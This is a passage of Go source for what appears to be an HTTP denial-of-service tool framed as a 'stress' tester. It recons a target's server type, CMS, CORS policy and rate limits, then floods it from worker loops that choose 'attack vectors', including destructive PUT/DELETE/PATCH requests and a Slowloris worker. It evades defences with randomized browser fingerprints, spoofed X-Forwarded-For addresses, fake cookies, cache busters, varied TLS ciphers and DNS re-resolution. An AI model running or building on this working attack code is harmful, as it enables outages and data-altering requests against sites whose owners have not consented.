		req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nAccept: text/html\r\n\r\n", ep, hostHdr)
		conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
		if _, err := conn.Write([]byte(req)); err != nil {
			conn.Close()
			continue
		}
		conn.SetWriteDeadline(time.Time{})

		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		var buf [8192]byte
		n, _ := conn.Read(buf[:])
		conn.SetReadDeadline(time.Time{})
		conn.Close()

		if n > 0 {
			resp := string(buf[:n])
			headers := parseResponseHeaders(resp)
			result = analyzeSecurityHeaders(headers)
			break
		}

		time.Sleep(100 * time.Millisecond)
	}
	return result
}

func parseResponseHeaders(resp string) http.Header {
	h := make(http.Header)
	lines := strings.Split(resp, "\r\n")
	inHeaderSection := false
	for _, line := range lines {
		if strings.HasPrefix(line, "HTTP/") {
			inHeaderSection = true
			continue
		}
		if inHeaderSection && line == "" {
			break
		}
		if inHeaderSection && strings.Contains(line, ":") {
			parts := strings.SplitN(line, ":", 2)
			key := strings.TrimSpace(parts[0])
			val := strings.TrimSpace(parts[1])
			h.Add(key, val)
		}
	}
	return h
}

func detectServerType(serverHeader string) (serverType, serverVersion string) {
	if serverHeader == "" {
		return "Unknown", ""
	}

	upper := strings.ToUpper(serverHeader)
	switch {
	case strings.Contains(upper, "APACHE"):
		serverType = "Apache"
		if idx := strings.Index(serverHeader, "/"); idx >= 0 {
			version := serverHeader[idx+1:]
			if sp := strings.Index(version, " "); sp >= 0 {
				serverVersion = version[:sp]
			} else {
				serverVersion = version
			}
		}
	case strings.Contains(upper, "NGINX"):
		serverType = "Nginx"
		if idx := strings.Index(serverHeader, "/"); idx >= 0 {
			version := serverHeader[idx+1:]
			if sp := strings.Index(version, " "); sp >= 0 {
				serverVersion = version[:sp]
			} else {
				serverVersion = version
			}
		}
	case strings.Contains(upper, "IIS"):
		serverType = "Microsoft IIS"
		for i := 0; i < len(serverHeader); i++ {
			if serverHeader[i] >= '1' && serverHeader[i] <= '9' && (i+2) < len(serverHeader) {
				if serverHeader[i+2] == '.' {
					serverVersion = serverHeader[i : i+3]
					break
				}
			}
		}
	case strings.Contains(upper, "CADDY"):
		serverType = "Caddy"
	case strings.Contains(upper, "LITESPEED"):
		serverType = "LiteSpeed"
	default:
		serverType = serverHeader
	}

	return serverType, serverVersion
}

func detectHTTP2(ctx context.Context, addr string, cfg StressConfig, hostHdr string) bool {
	netDialer := &net.Dialer{Timeout: 3 * time.Second}
	tlsCfg := &tls.Config{
		ServerName:         hostHdr,
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2", "http/1.1"},
		MinVersion:         tls.VersionTLS12,
	}
	conn, err := (&tls.Dialer{NetDialer: netDialer, Config: tlsCfg}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer conn.Close()

	state := conn.(*tls.Conn).ConnectionState()
	return state.NegotiatedProtocol == "h2"
}

func detectCORS(ctx context.Context, addr string, cfg StressConfig, hostHdr string) (corsEnabled bool, corsOrigin string) {
	conn, err := dialConn(ctx, addr, cfg.IsTLS, hostHdr)
	if err != nil {
		return false, ""
	}
	defer conn.Close()

	req := fmt.Sprintf("OPTIONS / HTTP/1.1\r\nHost: %s\r\nOrigin: https://evil.com\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nAccept: text/html\r\n\r\n", hostHdr)
	conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
	if _, err := conn.Write([]byte(req)); err != nil {
		return false, ""
	}
	conn.SetWriteDeadline(time.Time{})

	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	var buf [4096]byte
	n, _ := conn.Read(buf[:])
	conn.SetReadDeadline(time.Time{})

	if n == 0 {
		return false, ""
	}

	resp := string(buf[:n])
	for _, line := range strings.Split(resp, "\r\n") {
		line = strings.TrimSpace(line)
		lower := strings.ToLower(line)
		if strings.HasPrefix(lower, "access-control-allow-origin:") {
			origin := strings.TrimSpace(strings.TrimPrefix(lower, "access-control-allow-origin:"))
			if origin == "*" || strings.Contains(origin, hostHdr) {
				return true, origin
			}
		}
	}

	return false, ""
}

func detectRateLimiting(ctx context.Context, addr string, cfg StressConfig, hostHdr string) (detected bool, info string, code int, granular bool) {
	rateLimitHeaders := []string{"RateLimit-Limit", "X-RateLimit-Limit", "Retry-After"}

	for i := 0; i < 20; i++ {
		if ctx.Err() != nil {
			break
		}
		conn, err := dialConn(ctx, addr, cfg.IsTLS, hostHdr)
		if err != nil {
			continue
		}

		req := fmt.Sprintf("GET /%d HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nAccept: text/html\r\nX-Forwarded-For: %d.%d.%d.%d\r\n\r\n",
			i, hostHdr, i%256, (i*3)%256, (i*7)%256, (i*11)%256)
		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
		if _, err := conn.Write([]byte(req)); err != nil {
			conn.Close()
			continue
		}
		conn.SetWriteDeadline(time.Time{})

		conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
		var tmp [4096]byte
		n, _ := conn.Read(tmp[:])
		conn.SetReadDeadline(time.Time{})
		conn.Close()

		if n > 0 {
			resp := string(tmp[:n])
			for _, line := range strings.Split(resp, "\r\n") {
				line = strings.TrimSpace(line)
				if strings.HasPrefix(line, "HTTP/") {
					parts := strings.Split(line, " ")
					if len(parts) >= 3 && parts[1] == "429" {
						for _, h := range rateLimitHeaders {
							if idx := strings.Index(strings.ToLower(resp), strings.ToLower(h)); idx >= 0 {
								info = fmt.Sprintf("Rate limit: %s found", h)
								break
							}
						}
						return true, info, 429, false
					}
				}
			}
		}

		time.Sleep(50 * time.Millisecond)
	}

	return false, "", 0, false
}

func detectCMS(ctx context.Context, addr string, cfg StressConfig, hostHdr string) (name, version string) {
	endpoints := []struct {
		path       string
		signatures map[string]string
	}{
		{"/wp-includes/version.php", map[string]string{"WordPress": "WordPress"}},
		{"/wp-login.php", map[string]string{"wordpress": "WordPress"}},
		{"/drupal/settings.js", map[string]string{"Drupal": "Drupal"}},
		{"/modules/system/css/drupal.css", map[string]string{"Drupal": "Drupal"}},
		{"/media/com_joomlaupdate/", map[string]string{"Joomla": "Joomla"}},
		{"/templates/ja_t3_blank/css/template.css", map[string]string{"Joomla": "Joomla"}},
	}

	for _, ep := range endpoints {
		if ctx.Err() != nil {
			break
		}
		conn, err := dialConn(ctx, addr, cfg.IsTLS, hostHdr)
		if err != nil {
			continue
		}

		req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36\r\nAccept: text/html\r\n\r\n", ep.path, hostHdr)
		conn.SetWriteDeadline(time.Now().Add(3 * time.Second))
		if _, err := conn.Write([]byte(req)); err != nil {
			conn.Close()
			continue
		}
		conn.SetWriteDeadline(time.Time{})

		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		var buf [8192]byte
		n, _ := conn.Read(buf[:])
		conn.SetReadDeadline(time.Time{})
		conn.Close()

		if n > 0 {
			resp := string(buf[:n])
			for content, cmsName := range ep.signatures {
				if strings.Contains(strings.ToLower(resp), content) {
					return cmsName, ""
				}
			}
		}

		time.Sleep(100 * time.Millisecond)
	}

	return "", ""
}

func (m *Manager) connectionWorker(ctx context.Context, conn net.Conn, rng *rand.Rand, hostHdr string) {
	for ctx.Err() == nil {
		vector := m.selectAttackVector(rng)
		alive, latency := m.sendBurst(conn, rng, hostHdr, vector.method, vector.path, vector.body, vector.isDestructive)
		if alive {
			m.totalReqs.Add(1)
			m.totalLatency.Add(latency.Milliseconds())
		} else {
			m.totalErrors.Add(1)
			return
		}
		jitter := time.Duration(rng.Intn(200)+30) * time.Millisecond
		select {
		case <-ctx.Done():
			return
		case <-time.After(jitter):
		}
	}
}

type attackVector struct {
	method        string
	path          string
	body          []byte
	isDestructive bool
}

func (m *Manager) selectAttackVector(rng *rand.Rand) attackVector {
	if rng.Intn(10) < 3 {
		method := destructiveMethods[rng.Intn(len(destructiveMethods))]
		path := m.selectPath(rng)
		body := m.selectBody(rng, method)
		return attackVector{method: method, path: path, body: body, isDestructive: true}
	}

	method := m.selectMethod(rng)
	path := m.selectPath(rng)
	body := m.selectBody(rng, method)

	return attackVector{method: method, path: path, body: body, isDestructive: false}
}

func (m *Manager) selectMethod(rng *rand.Rand) string {
	if m.cfg.ReconResults != nil && len(m.cfg.ReconResults.SupportedMethods) > 0 && rng.Intn(10) < 7 {
		return m.cfg.ReconResults.SupportedMethods[rng.Intn(len(m.cfg.ReconResults.SupportedMethods))]
	}
	return httpMethods[rng.Intn(len(httpMethods))]
}

func (m *Manager) selectPath(rng *rand.Rand) string {
	path := m.cfg.Path

	if m.cfg.ReconResults != nil {
		endpointPool := m.cfg.ReconResults.GetAttackEndpoints()
		if len(endpointPool) > 0 && rng.Intn(10) < 6 {
			path = endpointPool[rng.Intn(len(endpointPool))]
		} else {
			path = paths[rng.Intn(len(paths))]
		}
	} else {
		path = paths[rng.Intn(len(paths))]
	}

	if len(cacheBusters) > 0 {
		buster := cacheBusters[rng.Intn(len(cacheBusters))]
		if buster != "" {
			cb := fmt.Sprintf(buster, time.Now().UnixNano())
			if strings.Contains(path, "?") {
				path += "&" + cb
			} else {
				path += "?" + cb
			}
		}
	}

	return path
}

func (m *Manager) selectBody(rng *rand.Rand, method string) []byte {
	if method == "GET" || method == "HEAD" || method == "OPTIONS" || method == "TRACE" {
		return nil
	}
	ct := contentTypes[rng.Intn(len(contentTypes))]
	return createBody(rng, ct)
}

// ─── Slowloris ────────────────────────────────────────────────────────────────

func (m *Manager) slowlorisWorker(ctx context.Context, conn net.Conn, rng *rand.Rand, hostHdr string) {
	hostPort := hostHdr
	if m.cfg.Port != 80 && m.cfg.Port != 443 {
		hostPort = fmt.Sprintf("%s:%d", hostHdr, m.cfg.Port)
	}

	headers := []string{
		"GET / HTTP/1.1\r\n",
		"Host: " + hostPort + "\r\n",
		"User-Agent: " + randomUserAgent(rng) + "\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
		"Accept-Language: " + languages[rng.Intn(len(languages))] + "\r\n",
		"Accept-Encoding: gzip, deflate, br\r\n",
		"Cookie: sessionid=" + randomString(rng, 32) + "\r\n",
		"X-Forwarded-For: " + fmt.Sprintf("%d.%d.%d.%d",
			rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256)) + "\r\n",
	}

	for i, h := range headers {
		if ctx.Err() != nil {
			return
		}
		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
		if _, err := fmt.Fprint(conn, h); err != nil {
			return
		}
		conn.SetWriteDeadline(time.Time{})
		if i < len(headers)-1 {
			select {
			case <-ctx.Done():
				return
			case <-time.After(m.cfg.SlowlorisDelay):
			}
		}
	}

	for ctx.Err() == nil {
		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
		line := "X-Mystery-Header: " + randomString(rng, 10) + "\r\n"
		if _, err := conn.Write([]byte(line)); err != nil {
			return
		}
		conn.SetWriteDeadline(time.Time{})
		select {
		case <-ctx.Done():
			return
		case <-time.After(m.cfg.SlowlorisDelay):
		}
	}
}

// ─── Request building & sending ───────────────────────────────────────────────

func (m *Manager) sendBurst(conn net.Conn, rng *rand.Rand, hostHdr, method, path string, body []byte, isDestructive bool) (alive bool, latency time.Duration) {
	buf := bufPool.Get().(*bytes.Buffer)
	buf.Reset()

	start := time.Now()
	buildRequest(buf, m.cfg, rng, method, hostHdr, path, body)

	_, writeErr := buf.WriteTo(conn)
	bufPool.Put(buf)

	if writeErr != nil {
		return false, 0
	}

	conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
	var tmp [4096]byte
	for {
		n, err := conn.Read(tmp[:])
		if n > 0 {
		}
		if err != nil {
			break
		}
	}
	conn.SetReadDeadline(time.Time{})

	latency = time.Since(start)
	return true, latency
}

func buildRequest(buf *bytes.Buffer, cfg StressConfig, rng *rand.Rand, method, hostHdr, path string, body []byte) {
	hostPort := hostHdr
	if cfg.Port != 80 && cfg.Port != 443 {
		hostPort = fmt.Sprintf("%s:%d", hostHdr, cfg.Port)
	}

	ua := randomUserAgent(rng)
	chrome := isChromeUA(ua)

	fmt.Fprintf(buf, "%s %s HTTP/1.1\r\n", method, path)
	buf.WriteString("Host: " + hostPort + "\r\n")

	if chrome {
		cv := randomChromeVersion(rng)
		fmt.Fprintf(buf, "sec-ch-ua: \"Google Chrome\";v=\"%s\", \"Chromium\";v=\"%s\", \";Not A Brand\";v=\"99\"\r\n", cv, cv)
		buf.WriteString("sec-ch-ua-mobile: ?0\r\n")
		fmt.Fprintf(buf, "sec-ch-ua-platform: \"%s\"\r\n", randomPlatform(rng))
		buf.WriteString("Priority: u=0, i\r\n")
	}

	buf.WriteString("Upgrade-Insecure-Requests: 1\r\n")
	buf.WriteString("User-Agent: " + ua + "\r\n")
	buf.WriteString("Accept: " + acceptHeaders[rng.Intn(len(acceptHeaders))] + "\r\n")
	buf.WriteString("Accept-Language: " + languages[rng.Intn(len(languages))] + "\r\n")
	buf.WriteString("Accept-Encoding: gzip, deflate, br\r\n")
	buf.WriteString("DNT: 1\r\n")

	buf.WriteString("Sec-Fetch-Site: none\r\n")
	buf.WriteString("Sec-Fetch-Mode: navigate\r\n")
	buf.WriteString("Sec-Fetch-User: ?1\r\n")
	buf.WriteString("Sec-Fetch-Dest: document\r\n")

	buf.WriteString("Cookie: sessionid=" + randomString(rng, 32) + "\r\n")
	buf.WriteString("Referer: https://" + hostHdr + "/\r\n")
	buf.WriteString("Origin: https://" + hostHdr + "\r\n")
	buf.WriteString("Cache-Control: max-age=0\r\n")

	fmt.Fprintf(buf, "X-Forwarded-For: %d.%d.%d.%d\r\n",
		rng.Intn(256), rng.Intn(256), rng.Intn(256), rng.Intn(256))

	if method == "PUT" || method == "DELETE" || method == "PATCH" {
		buf.WriteString("If-Match: \"some-etag-value\"\r\n")
		buf.WriteString("Content-Location: /target-resource\r\n")
	}
	if method == "PUT" || method == "PATCH" {
		buf.WriteString("Content-MD5: " + randomString(rng, 24) + "\r\n")
	}
	if method == "DELETE" {
		buf.WriteString("Destination: /deleted-resource\r\n")
	}

	if body != nil && len(body) > 0 {
		ct := contentTypes[rng.Intn(len(contentTypes))]
		fmt.Fprintf(buf, "Content-Type: %s\r\nContent-Length: %d\r\n", ct, len(body))
		buf.Write(body)
	} else if method == "POST" || method == "PUT" || method == "PATCH" {
		ct := contentTypes[rng.Intn(len(contentTypes))]
		genBody := createBody(rng, ct)
		fmt.Fprintf(buf, "Content-Type: %s\r\nContent-Length: %d\r\n", ct, len(genBody))
		buf.Write(genBody)
	} else {
		buf.WriteString("Content-Length: 0\r\n")
	}

	buf.WriteString("Connection: keep-alive\r\n\r\n")
}

// ─── DNS ──────────────────────────────────────────────────────────────────────

func (m *Manager) dnsRefresh(ctx context.Context, host string, interval time.Duration) {
	ticker := time.NewTicker(interval)
	defer ticker.Stop()
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			addrs, err := lookupIPv4(host)
			if err != nil {
				slog.Warn("DNS re-resolution failed", "host", host, "err", err)
				continue
			}
			m.updateIPs(addrs)
			slog.Info("DNS refreshed", "host", host, "ips", addrs)
			select {
			case m.rebalanceCh <- addrs:
			default:
				slog.Debug("DNS update dropped (rebalance busy)", "host", host)
			}
		}
	}
}

func lookupIPv4(host string) ([]string, error) {
	addrs, err := net.LookupIP(host)
	if err != nil {
		return nil, err
	}
	var out []string
	for _, a := range addrs {
		if ip4 := a.To4(); ip4 != nil {
			out = append(out, ip4.String())
		}
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("no IPv4 addresses found for %s", host)
	}
	sort.Strings(out)
	return out, nil
}

// ─── Dialling ─────────────────────────────────────────────────────────────────

var sharedDialer = &net.Dialer{
	Timeout:   3 * time.Second,
	KeepAlive: 30 * time.Second,
}

var dialRNG = rand.New(rand.NewSource(time.Now().UnixNano()))

func dialConn(ctx context.Context, addr string, isTLS bool, serverName string) (net.Conn, error) {
	if isTLS {
		cipherSuite := tlsCipherSuites[dialRNG.Intn(len(tlsCipherSuites))]
		tlsCfg := &tls.Config{
			ServerName:         serverName,
			InsecureSkipVerify: true,
			CipherSuites:       []uint16{cipherSuite},
			MinVersion:         tls.VersionTLS12,
			MaxVersion:         tls.VersionTLS13,
			CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256},
		}
		return (&tls.Dialer{NetDialer: sharedDialer, Config: tlsCfg}).DialContext(ctx, "tcp", addr)
	}
	return sharedDialer.DialContext(ctx, "tcp", addr)
}

var tlsCipherSuites = []uint16{
	tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
	tls.TLS_RSA_WITH_AES_128_GCM_SHA256,
	tls.TLS_RSA_WITH_AES_256_GCM_SHA384,
}

// ─── Metrics ──────────────────────────────────────────────────────────────────

func (m *Manager) runStats(ctx context.Context, interval time.Duration) {
	ticker := time.NewTicker(interval)
	defer ticker.Stop()
	var lastReqs, lastErrs, lastLatency int64
	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			reqs := m.totalReqs.Load()
			errs := m.totalErrors.Load()
			latency := m.totalLatency.Load()
			deltaReqs := reqs - lastReqs
			deltaErrs := errs - lastErrs
			deltaLatency := latency - lastLatency
			lastReqs, lastErrs, lastLatency = reqs, errs, latency

			rps := float64(deltaReqs) / interval.Seconds()
			avgLatency := time.Duration(0)
			if deltaReqs > 0 {
				avgLatency = time.Duration(deltaLatency / deltaReqs)
			}
			slog.Info("stats",
				"req/s", fmt.Sprintf("%.0f", rps),
				"errors", deltaErrs,
				"avg_latency", avgLatency,
				"total_reqs", reqs,
				"total_errors", errs,
			)
		}
	}
}

// ─── Randomisation helpers ────────────────────────────────────────────────────

func randomUserAgent(rng *rand.Rand) string {
	osList := []string{
		"Windows NT 10.0; Win64; x64",
		"Macintosh; Intel Mac OS X 10_15_7",
		"X11; Linux x86_64",
	}
	os := osList[rng.Intn(len(osList))]
	if rng.Intn(2) == 0 {
		v := fmt.Sprintf("%d.0.%d.%d", rng.Intn(30)+90, rng.Intn(4000), rng.Intn(200))
		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, v)
	}
	major := rng.Intn(30) + 70
	minor := rng.Intn(10)
	return fmt.Sprintf("Mozilla/5.0 (%s; rv:%d.0) Gecko/20100101 Firefox/%d.%d", os, major, major, minor)
}

func isChromeUA(ua string) bool {
	return strings.Contains(ua, "Chrome/")
}

func randomChromeVersion(rng *rand.Rand) string {
	return strconv.Itoa(rng.Intn(30) + 90)
}

func randomPlatform(rng *rand.Rand) string {
	return []string{"Windows", "macOS", "Linux"}[rng.Intn(3)]
}

func randomString(rng *rand.Rand, n int) string {
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rng.Intn(len(letters))]
	}
	return string(b)
}

// createBody generates POST bodies with varied sizes for realism.
func createBody(rng *rand.Rand, ct string) []byte {
	var b bytes.Buffer
	switch ct {
	case "application/x-www-form-urlencoded":
		vals := url.Values{}
		for i := 0; i < 3+rng.Intn(5); i++ {
			var key, val string
			switch rng.Intn(4) {
			case 0:
				key, val = "username", randomString(rng, 6+rng.Intn(10))
			case 1:
				key = "email"
				val = fmt.Sprintf("%s@example.com", randomString(rng, 4+rng.Intn(8)))
			case 2:
				key, val = "password", randomString(rng, 8+rng.Intn(16))
			default:
				key, val = randomString(rng, 4+rng.Intn(4)), randomString(rng, 6+rng.Intn(12))
			}
			vals.Set(key, val)
		}
		b.WriteString(vals.Encode())

	case "application/json":
		size := 3 + rng.Intn(8)
		b.WriteByte('{')
		for i := 0; i < size; i++ {
			if i > 0 {
				b.WriteByte(',')
			}
			fmt.Fprintf(&b, `"%s":"%s"`, randomString(rng, 4+rng.Intn(6)), randomString(rng, 6+rng.Intn(14)))
		}
		b.WriteByte('}')

	default:
		b.WriteString("text_" + randomString(rng, 10+rng.Intn(20)))
	}
	return b.Bytes()
}

// ─── Misc helpers ─────────────────────────────────────────────────────────────

func determinePort(u *url.URL) int {
	if p := u.Port(); p != "" {
		if i, err := strconv.Atoi(p); err == nil {
			return i
		}
	}
	if strings.EqualFold(u.Scheme, "https") {
		return 443
	}
	return 80
}
